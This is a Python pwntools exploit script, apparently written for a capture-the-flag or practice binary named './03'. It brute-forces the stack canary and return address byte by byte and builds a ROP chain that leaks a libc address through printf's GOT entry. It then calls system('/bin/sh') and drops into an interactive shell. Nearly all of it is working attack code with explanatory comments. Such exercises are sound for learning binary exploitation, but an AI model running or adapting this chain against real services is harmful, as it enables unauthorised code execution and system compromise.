#!/usr/bin/env python3

from pwn import *

# NOTE: this path cannot contain spaces
process_name = './03'

use_gdb = False
gdb_args = '''
break *func
#break *func+77
gef config context.nb_lines_stack 20
gef config context.nb_lines_code 20
#set follow-fork-mode child
continue'''

if use_gdb:
    # We start our process in GDB
    # This allows us to also immediately execute some gdb commands
    p = gdb.debug(process_name, gdb_args)
else:
    # We start our process normally
    p = process(process_name)

elf = ELF(process_name) # Extract data from binary

libc = ELF("/usr/lib/libc.so.6")
rop = ROP(elf) # Find ROP gadgets

def get_addr(buffer_payload, func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop = buffer_payload + ebp.encode() + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    # Send our rop-chain payload
    print(p.clean())
    p.sendline(rop)

    # Parse leaked address
    leaked_string = p.recvuntil("a")
    print(leaked_string)
    recieved = leaked_string.replace(b"overflow me:", b"").strip()
    recieved = recieved.replace(b"Now you face the wrath of my canary!", b"").strip()
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))

    if libc != "":
        libc.address = leak - libc.symbols[func_name] # Save libc base
        log.info("libc base @ %s" % hex(libc.address))

    return hex(leak)


def bruteforce_next_byte(payload):
    for i in range(256):
        next_test = 0x01 * i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        # Note that we cannot send any newlines here as "read" will just absorb them into the buffer
        p.send(test_payload)
        output = p.recvuntil(".")
        #print(output)
        if "bye" in output.decode():
            print(f"[+] Found next byte {hex(i)}")
            return next_test
        if i == 255:
            print(f"[-] Failed to find next byte")
            exit()


offset = 'A'*24 + 'BBBBBBBBCCCCCCCC'
ebp = 'XXXXXXXX'

p.clean()
payload_to_canary = offset.encode()

canary = b''
for i in range(8):
    canary = canary + bruteforce_next_byte(payload_to_canary + canary)

print(f"Found canary value: {canary.hex()}")
payload_with_canary = payload_to_canary + canary

payload_with_canary_and_ebp = payload_with_canary + ebp.encode()
rip = b''
for i in range(8):
    rip = rip + bruteforce_next_byte(payload_with_canary_and_ebp + rip)
rip = u64(rip.ljust(8, b"\x00"))
print(f"Found rip value: {hex(rip)}")

# We also need to substract 0x1000 from them all. As we can see in 'objdump', the addresses start at 1000
elf.address = rip - (rip & 0xfff) - 0x1000
# We have to do this AFTER setting elf.address, which will then automatically be added to our search
# If we do this before setting elf.address, we will just get the address without the ASLR offset
MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt["printf"]
# For the ROP gadget we need to add it manually (I could not get this to work with pwntools)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] + elf.address

log.info("main start: " + hex(MAIN_PLT))
log.info("printf plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

get_addr(payload_with_canary, "printf")

# We have to do this AFTER doing get_addr once. get_addr will set the base address of libc, which will then automatically be added to our search
# If we do this before setting libc, we will just get the address without the ASLR offset
BIN_SH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]

payload = payload_with_canary + ebp.encode() + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM)

print(p.clean())
p.sendline(payload)

# Receive all data that the application sent us that we have not yet processed and print it
print(p.clean())
# Start interaction with application
p.interactive()
